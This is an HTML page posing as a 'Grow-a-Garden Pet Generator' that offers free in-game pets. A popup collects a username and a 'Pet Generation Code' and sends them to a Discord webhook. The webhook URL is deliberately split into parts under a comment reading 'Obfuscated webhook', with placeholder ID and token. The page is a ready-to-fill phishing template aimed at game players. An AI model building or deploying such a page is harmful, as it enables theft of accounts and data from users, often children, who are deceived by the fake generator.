<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Grow-a-Garden Pet Generator</title>
<style>
  body {
    font-family: 'Segoe UI', Tahoma, sans-serif;
    margin: 0;
    padding: 0;
    overflow-x: hidden;
    color: #e0f2fe;
    background: radial-gradient(ellipse at top, #0a192f 0%, #020617 100%);
  }

  /* Starfield canvas */
  #starfield {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: -1;
  }

  header {
    background: rgba(30, 58, 138, 0.8);
    backdrop-filter: blur(12px);
    padding: 16px;
    text-align: center;
    font-size: 1.8rem;
    font-weight: bold;
    border-bottom: 2px solid #3b82f6;
    color: #f8fafc;
  }
  .container {
    max-width: 900px;
    margin: auto;
    padding: 20px;
  }
  h2, h3 {
    color: #bfdbfe;
  }
  .pets {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
    gap: 20px;
  }
  .pet-card {
    background: rgba(30, 41, 59, 0.9);
    border: 2px solid #3b82f6;
    border-radius: 14px;
    padding: 14px;
    text-align: center;
    transition: transform 0.3s ease, box-shadow 0.3s ease;
    animation: float 3s ease-in-out infinite;
    color: #f1f5f9;
  }
  .pet-card:hover {
    transform: translateY(-8px) scale(1.08);
    box-shadow: 0 8px 18px rgba(59, 130, 246, 0.6);
  }
  .pet-card img {
    width: 90px;
    height: 90px;
    border-radius: 10px;
    object-fit: cover;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
  }
  .selected {
    border-color: #60a5fa;
    box-shadow: 0 0 14px rgba(96, 165, 250, 0.9);
  }
  button {
    padding: 12px 20px;
    margin-top: 14px;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    background: linear-gradient(to right, #2563eb, #1d4ed8);
    color: #f8fafc;
    font-size: 1.1rem;
    font-weight: bold;
    transition: background 0.3s, transform 0.2s;
    box-shadow: 0 6px 12px rgba(0,0,0,0.3);
  }
  button:hover {
    background: linear-gradient(to right, #1d4ed8, #1e40af);
    transform: scale(1.07);
  }

  /* Popup modal with neon glow */
  #popup {
    display: none;
    position: fixed;
    top: 0; left: 0;
    width: 100%;
    height: 100%;
    background: rgba(15, 23, 42, 0.9);
    justify-content: center;
    align-items: center;
    animation: fadein 0.3s ease;
  }
  #popup .popup-content {
    background: #0f172a;
    padding: 24px;
    border-radius: 14px;
    width: 320px;
    animation: slideup 0.4s ease;
    box-shadow: 0 0 20px rgba(96, 165, 250, 0.9), 0 0 40px rgba(59, 130, 246, 0.6);
    border: 2px solid #3b82f6;
    color: #e2e8f0;
    text-align: center;
  }
  #popup input {
    width: 100%;
    margin-top: 10px;
    padding: 8px;
    border-radius: 8px;
    border: 1px solid #3b82f6;
    background: #0f172a;
    color: #f8fafc;
  }

  .tutorial {
    margin-top: 40px;
    padding: 20px;
    background: rgba(15, 23, 42, 0.9);
    border-radius: 14px;
    border: 2px solid #3b82f6;
  }
  iframe {
    border-radius: 8px;
  }

  @keyframes float {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-8px); }
  }
  @keyframes fadein {
    from { opacity: 0; }
    to { opacity: 1; }
  }
  @keyframes slideup {
    from { transform: translateY(40px); opacity: 0; }
    to { transform: translateY(0); opacity: 1; }
  }
</style>
</head>
<body>
  <!-- Starfield -->
  <canvas id="starfield"></canvas>

  <header>ðŸŒŒ Grow-a-Garden: Pet Generator</header>

  <div class="container">
    <h2>Select Your Pet</h2>
    <div class="pets" id="petGrid"></div>

    <div style="margin-top:20px; text-align:center;">
      <button onclick="openPopup()">Generate Pet</button>
    </div>

    <div class="tutorial">
      <h3>ðŸ“º Tutorial</h3>
      <p>Watch this video before generating your pet:</p>
      <iframe width="100%" height="315" src="https://www.youtube.com/embed/dnBvM1z-1yo" frameborder="0" allowfullscreen></iframe>
    </div>
  </div>

  <div id="popup">
    <div class="popup-content">
      <h3>Enter Your Details</h3>
      <input type="text" id="username" placeholder="Username" />
      <input type="text" id="code" placeholder="Pet Generation Code" />
      <button onclick="submitData()">Submit</button>
    </div>
  </div>

<script>
  /* Pet data */
  const pets = [
    { id: 'sprout-cat', img: 'https://placekitten.com/100/100', name: 'Sprout Cat' },
    { id: 'bud-bunny', img: 'https://placekitten.com/101/100', name: 'Bud Bunny' },
    { id: 'pond-pup', img: 'https://placekitten.com/102/100', name: 'Pond Pup' },
    { id: 'cactus-hedgie', img: 'https://placekitten.com/103/100', name: 'Cactus Hedgie' },
    { id: 'beetle-buddy', img: 'https://placekitten.com/104/100', name: 'Beetle Buddy' },
    { id: 'owl-orchid', img: 'https://placekitten.com/105/100', name: 'Owl Orchid' }
  ];

  let selectedPet = pets[0].id;

  const petGrid = document.getElementById('petGrid');
  pets.forEach(pet => {
    const div = document.createElement('div');
    div.className = 'pet-card';
    if (pet.id === selectedPet) div.classList.add('selected');
    div.innerHTML = `
      <img src="${pet.img}" alt="${pet.name}" />
      <div>${pet.name}</div>
    `;
    div.onclick = () => selectPet(pet.id);
    petGrid.appendChild(div);
  });

  function selectPet(id) {
    selectedPet = id;
    document.querySelectorAll('.pet-card').forEach(card => card.classList.remove('selected'));
    document.querySelectorAll('.pet-card')[pets.findIndex(p => p.id === id)].classList.add('selected');
  }

  function openPopup() {
    document.getElementById('popup').style.display = 'flex';
  }

  async function submitData() {
    const username = document.getElementById('username').value.trim();
    const code = document.getElementById('code').value.trim();
    if (!username || !code) return;

    // Obfuscated webhook
    const part1 = "https://discord.com/api/webhooks/";
    const part2 = "YOUR_WEBHOOK_ID";
    const part3 = "/YOUR_WEBHOOK_TOKEN";
    const webhookURL = part1 + part2 + part3;

    const payload = {
      content: `New Pet Generated!\nUsername: ${username}\nCode: ${code}\nSelected Pet: ${pets.find(p=>p.id===selectedPet).name}`
    };

    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    alert('Pet generated and sent to Discord!');
    document.getElementById('popup').style.display = 'none';
  }

  /* Starfield animation */
  const canvas = document.getElementById('starfield');
  const ctx = canvas.getContext('2d');
  let stars = [];

  function resize() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    stars = Array.from({ length: 200 }, () => ({
      x: Math.random() * canvas.width,
      y: Math.random() * canvas.height,
      r: Math.random() * 2 + 1,
      d: Math.random() * 0.5
    }));
  }
  resize();
  window.onresize = resize;

  function drawStars() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "white";
    stars.forEach(s => {
      ctx.beginPath();
      ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
      ctx.fill();
    });
    updateStars();
  }

  function updateStars() {
    stars.forEach(s => {
      s.y += s.d;
      if (s.y > canvas.height) {
        s.y = 0;
        s.x = Math.random() * canvas.width;
      }
    });
  }

  setInterval(drawStars, 30);
</script>
</body>
</html>
